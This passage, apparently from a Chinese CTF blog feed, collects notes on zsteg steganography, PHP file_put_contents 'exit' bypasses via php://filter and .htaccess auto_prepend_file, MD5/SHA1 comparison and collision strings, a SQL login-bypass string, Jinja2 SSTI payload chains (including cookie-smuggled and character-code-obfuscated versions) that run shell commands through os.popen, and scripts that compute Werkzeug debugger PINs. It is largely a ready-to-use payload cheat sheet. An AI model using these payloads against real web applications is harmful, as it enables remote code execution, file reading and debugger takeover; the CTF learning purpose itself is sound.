        <content type="html"><![CDATA[<h1 id="安装zsteg"><a href="#安装zsteg" class="headerlink" title="安装zsteg"></a>安装zsteg</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zed-0xff/zsteg</span><br><span class="line"><span class="built_in">cd</span> zsteg/</span><br><span class="line">gem install zsteg</span><br></pre></td></tr></table></figure><p>可能安装会因为国内网速原因导致没反应，换个RubyGems的源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gem sources --remove https://rubygems.org/</span><br><span class="line">gem sources --add https://gems.ruby-china.com/</span><br><span class="line">gem sources -l</span><br></pre></td></tr></table></figure><h1 id="zsteg使用方法"><a href="#zsteg使用方法" class="headerlink" title="zsteg使用方法"></a>zsteg使用方法</h1><p>查看帮助</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -h</span><br></pre></td></tr></table></figure><p>查看LSB信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg pcat.png</span><br></pre></td></tr></table></figure><p>检测zlib</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg zlib.bmp -b 1 -o xy -v</span><br></pre></td></tr></table></figure><p>显示细节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg pcat.png -v</span><br></pre></td></tr></table></figure><p>尝试所有已知的组合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg pcat.png -a</span><br></pre></td></tr></table></figure><p>导出内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -E <span class="string">&quot;b1,bgr,lsb,xy&quot;</span> pcat.png &gt; p.exe</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要是为了记录工具的使用，不然碰到图片隐写，不会用工具查看信息就尴尬了。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>file_put_content和die</title>
      <link href="/2023/10/21/file_put_content%E5%92%8Cdie/"/>
      <url>/2023/10/21/file_put_content%E5%92%8Cdie/</url>
      
        <content type="html"><![CDATA[<p>这个主要是因为一道反序列化题出现这个函数的相关知识才去搜索了一下.<br>file_put_content和die(任意结束或者闭合php语言)结合，分为三种方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span> . <span class="string">&quot;\nxxxxxx&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="对于第一种情况"><a href="#对于第一种情况" class="headerlink" title="对于第一种情况"></a>对于第一种情况</h1><p>文件名可控，文件内容可控</p><h2 id="1-base64编码绕过"><a href="#1-base64编码绕过" class="headerlink" title="1.base64编码绕过"></a>1.base64编码绕过</h2><p>利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;php://filter/convert.base64-decode/resource=s1mple.php&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;</span><br></pre></td></tr></table></figure><p>content内base64为什么会前面多加一个小写a呢，因为base64在解码的时候是将4个字节转化为3个字节，方便他转化，不然就全是乱码了(乱码的只有die就可以了OVO)，一个a不行就两个。</p><h2 id="2-rot13编码绕过"><a href="#2-rot13编码绕过" class="headerlink" title="2.rot13编码绕过"></a>2.rot13编码绕过</h2><p>和base64绕过的原理一样，但是这个编码方法并不会转化&lt;?,因此会导致后方我们写入的代码失去作用。</p><h2 id="3-。htaccess的预包含利用"><a href="#3-。htaccess的预包含利用" class="headerlink" title="3.。htaccess的预包含利用"></a>3.。htaccess的预包含利用</h2><p>利用 .htaccess的预包含文件的功能来进行攻破；自定义包含我们的flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=php://filter/write=string.strip_tags/resource=.htaccess</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span>=?&gt;php_value%20auto_prepend_file%20G:\s1mple.php</span><br></pre></td></tr></table></figure><p>同时传入如上的代码，首先来解释$filename的代码，这里引用了string.strip_tags过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；$content即闭合死亡代码使其完全消除，并且写入自定义包含文件<br>但是使用这个方法我们必须知道flag文件地址在哪里，还有string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>暂时只遇到这第一种情况，参考博客<a href="https://xz.aliyun.com/t/8163#top-c">https://xz.aliyun.com/t/8163#top-c</a><br>以后遇到其他情况也会逐渐补充</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5</title>
      <link href="/2023/10/19/md5/"/>
      <url>/2023/10/19/md5/</url>
      
        <content type="html"><![CDATA[<h1 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s21587387a</span><br></pre></td></tr></table></figure><h1 id="md5万能密码"><a href="#md5万能密码" class="headerlink" title="md5万能密码"></a>md5万能密码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure><h1 id="md5弱比较自身"><a href="#md5弱比较自身" class="headerlink" title="md5弱比较自身"></a>md5弱比较自身</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure><h1 id="md5强类型比较"><a href="#md5强类型比较" class="headerlink" title="md5强类型比较"></a>md5强类型比较</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=1</span><br><span class="line">ab名字据情况而定</span><br></pre></td></tr></table></figure><h1 id="md5字符强碰撞"><a href="#md5字符强碰撞" class="headerlink" title="md5字符强碰撞"></a>md5字符强碰撞</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><h1 id="sha1字符强碰撞"><a href="#sha1字符强碰撞" class="headerlink" title="sha1字符强碰撞"></a>sha1字符强碰撞</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/2023/10/19/ssti%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/"/>
      <url>/2023/10/19/ssti%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到shell后，如果没有找到flag，可以看看<span class="built_in">env</span>也就是popen(<span class="built_in">env</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">开头<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()末尾</span><br><span class="line">开头<span class="string">&#x27;&#x27;</span>.__class__.__bases__[0].__subclasses__()末尾</span><br></pre></td></tr></table></figure><p>在已知过滤的情况下，进行绕过构成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">开头()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[0][<span class="string">&#x27;__subcl&#x27;</span><span class="string">&#x27;asses__&#x27;</span>]()末尾</span><br><span class="line">[<span class="string">&#x27;__in&#x27;</span><span class="string">&#x27;it__&#x27;</span>].__globals__[<span class="string">&#x27;__bui&#x27;</span><span class="string">&#x27;ltins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span><span class="string">&#x27;al&#x27;</span>](<span class="string">&quot;__im&quot;</span><span class="string">&quot;port__(&#x27;o&#x27;&#x27;s&#x27;).po&quot;</span><span class="string">&quot;pen(&#x27;cat /T*&#x27;).read()&quot;</span>)末尾</span><br></pre></td></tr></table></figure><p>(如果要使用脚本搜索，必须要自带编译)例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%7B%22%22.__class__.__base__.__subclasses__()%7D%7D</span><br></pre></td></tr></table></figure><p>找到以下字段<br>os._wrap_close<br>warnings.catch_warnings</p><p>在使用脚本前，先试运行一次，查看爆出字段的内容，根据情况修改脚本鉴定内容。</p><p>找到<br>1.os._wrap_close  (存在popen，但也可以构造eval)<br>2.warnings.catch_warnings  (可能不存在popen，需要自己构造eval)<br>后，在其后加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)末尾  (如果用到<span class="built_in">base64</span>绕过，那串字符不需要加双引号例如<span class="built_in">echo</span> Y2F0IC9mbGFn |<span class="built_in">base64</span> -d|sh)</span><br><span class="line">添加了<span class="string">&quot;一些&quot;</span>过滤后(class,getattr,builtins,import,os)</span><br><span class="line">.__init__.__globals__[<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&quot;__im&quot;</span>+<span class="string">&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(&#x27;ls /&#x27;).read()&quot;</span>)末尾</span><br><span class="line">还有</span><br><span class="line">.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|sh&#x27;</span>).<span class="built_in">read</span>()末尾(得到第一个时能用到)</span><br><span class="line">还有</span><br><span class="line">.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](request.args.get(<span class="string">&quot;参数&quot;</span>)).<span class="built_in">read</span>()末尾ge?参数=<span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure><h1 id="利用config"><a href="#利用config" class="headerlink" title="利用config"></a>利用config</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).<span class="built_in">read</span>() &#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="lipsum-globals-含有os模块"><a href="#lipsum-globals-含有os模块" class="headerlink" title="lipsum.__globals__含有os模块"></a>lipsum.__globals__含有os模块</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;ls /&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="利用-builtins"><a href="#利用-builtins" class="headerlink" title="利用__builtins__"></a>利用__builtins__</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__.eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="对于过滤比较强的ssti"><a href="#对于过滤比较强的ssti" class="headerlink" title="对于过滤比较强的ssti"></a>对于过滤比较强的ssti</h1><p>可以考虑使用cookie传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[request.cookies.c][request.cookies.d][0][request.cookies.e]()[59][request.cookies.f][request.cookies.g][request.cookies.h][request.cookies.i](request.cookies.j).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">cookie:</span><br><span class="line">c=__class__;d=__bases__;e=__subclasses__;f=__init__;g=__globals__;h=__builtins__;i=open;j=/etc/passwd</span><br><span class="line">    或者;i=<span class="built_in">eval</span>;j=__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>说人话就是这条命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[0].__subclasses__()[185].__init__.__globals__.__builtins__.open(<span class="string">&quot;/flag&quot;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="SSTI通杀"><a href="#SSTI通杀" class="headerlink" title="SSTI通杀"></a>SSTI通杀</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(((lipsum|attr((&#x27;%c&#x27;*<span class="number">11</span>)%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">103</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">98</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>))|attr((&#x27;%c&#x27;*<span class="number">11</span>)%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">95</span>,<span class="number">95</span>))((&#x27;%c&#x27;*<span class="number">12</span>)%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">98</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>))|attr((&#x27;%c&#x27;*<span class="number">11</span>)%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">95</span>,<span class="number">95</span>))((&#x27;%c&#x27;*<span class="number">4</span>)%(<span class="number">101</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">108</span>))))((&#x27;%c&#x27;*<span class="number">42</span>)%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">41</span>)))%&#125;</span><br></pre></td></tr></table></figure><h1 id="计算pin值"><a href="#计算pin值" class="headerlink" title="计算pin值"></a>计算pin值</h1><p>如果在做题过程中遇到可读文件的ssti漏洞，则可以计算pin值</p><h2 id="如果python版本在3-6以及以下则可以使用md5的计算脚本"><a href="#如果python版本在3-6以及以下则可以使用md5的计算脚本" class="headerlink" title="如果python版本在3.6以及以下则可以使用md5的计算脚本"></a>如果python版本在3.6以及以下则可以使用md5的计算脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MD5</span></span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line"><span class="string">&#x27;flaskweb&#x27;</span> <span class="comment"># username</span></span><br><span class="line"><span class="string">&#x27;flask.app&#x27;</span>, <span class="comment"># modname</span></span><br><span class="line"><span class="string">&#x27;Flask&#x27;</span>, <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line"><span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line"><span class="string">&#x27;25214234362297&#x27;</span>, <span class="comment"># str(uuid.getnode()), /sys/class/net/ens33/address</span></span><br><span class="line"><span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span> <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line"><span class="keyword">if</span> not bit:</span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line"><span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">h.update(bit)</span><br><span class="line">h.update(b<span class="string">&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line"><span class="keyword">if</span> num is None:</span><br><span class="line">h.update(b<span class="string">&#x27;pinsalt&#x27;</span>)</span><br><span class="line">num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv = None</span><br><span class="line"><span class="keyword">if</span> rv is None:</span><br><span class="line"><span class="keyword">for</span> group_size <span class="keyword">in</span> 5, 4, 3:</span><br><span class="line"><span class="keyword">if</span> len(num) % group_size == 0:</span><br><span class="line">rv = <span class="string">&#x27;-&#x27;</span>.<span class="built_in">join</span>(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0, len(num), group_size))</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><h2 id="如果pyhton版本在3-8则需要使用sha1的计算脚本"><a href="#如果pyhton版本在3-8则需要使用sha1的计算脚本" class="headerlink" title="如果pyhton版本在3.8则需要使用sha1的计算脚本"></a>如果pyhton版本在3.8则需要使用sha1的计算脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1</span></span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line"><span class="string">&#x27;root&#x27;</span> <span class="comment"># /etc/passwd</span></span><br><span class="line"><span class="string">&#x27;flask.app&#x27;</span>, <span class="comment"># 默认值</span></span><br><span class="line"><span class="string">&#x27;Flask&#x27;</span>, <span class="comment"># 默认值</span></span><br><span class="line"><span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line"><span class="string">&#x27;2485377597870&#x27;</span>, <span class="comment"># /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line"><span class="comment"># machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line"><span class="string">&#x27;225374fa-04bc-4346-9f39-48fa82829ca900372e99d08b532fc64f056a1b0499b0f3193e7f94190a59b66efbaa5654227f&#x27;</span></span><br><span class="line"><span class="comment"># /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line"><span class="keyword">if</span> not bit:</span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line"><span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">h.update(bit)</span><br><span class="line">h.update(b<span class="string">&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line"><span class="keyword">if</span> num is None:</span><br><span class="line">h.update(b<span class="string">&#x27;pinsalt&#x27;</span>)</span><br><span class="line">num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv = None</span><br><span class="line"><span class="keyword">if</span> rv is None:</span><br><span class="line"><span class="keyword">for</span> group_size <span class="keyword">in</span> 5, 4, 3:</span><br><span class="line"><span class="keyword">if</span> len(num) % group_size == 0:</span><br><span class="line">rv = <span class="string">&#x27;-&#x27;</span>.<span class="built_in">join</span>(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0, len(num), group_size))</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SSTI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2023/10/19/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/10/19/sql%E6%B3%A8%E5%85%A5/</url>
      
